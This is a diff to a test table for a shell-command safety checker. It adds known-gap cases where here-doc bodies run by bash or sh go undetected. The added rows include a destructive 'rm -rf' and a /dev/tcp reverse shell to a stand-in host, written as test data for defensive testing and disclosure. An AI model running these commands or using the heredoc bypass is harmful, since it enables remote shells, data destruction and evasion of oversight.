@@ -83,6 +83,13 @@ pass	npx prettier@3.0.0 (pinned)	npx prettier@3.0.0
 xfn	S8-NPXTAG2 RESIDUAL: a major-only range counts as pinned (F17)	npx @types/node@20
 pass	npx @types/node@20.1.0 (scoped+exact pin)	npx @types/node@20.1.0
 xfn	S8-NPXTAG1 RESIDUAL: a dist-tag counts as pinned (F17)	npx pkg@latest
+# F18 HDEXEC (0.112.0 pre-tag review): a here-doc body that its consumer runs
+# is blanked like data. Shell-fed here-docs are rare in real use (19 of
+# 93,372 commands, none running a §8 shape); see docs/S8-RESIDUALS.md.
+xfn	S8-HDEXEC1 RESIDUAL: a heredoc body that bash runs is read as data (F18)	bash <<EOF__NL__rm -rf $X/y__NL__EOF
+xfn	S8-HDEXEC2 RESIDUAL: a heredoc piped into sh is read as data (F18)	cat <<EOF | sh__NL__rm -rf $X/y__NL__EOF
+xfn	S8-HDEXEC3 RESIDUAL: a /dev/tcp line in a heredoc that sh runs (F18)	sh <<'EOF'__NL__bash -i >& /dev/tcp/x.io/4444 0>&1__NL__EOF
+pass	S8-HDEXEC control: the same body under cat is data	cat <<EOF__NL__rm -rf $X/y__NL__EOF
 pass	npx ./local.tgz path	npx ./local.tgz
 pass	npx /abs/path.tgz path	npx /abs/path.tgz
 pass	npx --help flag only	npx --help
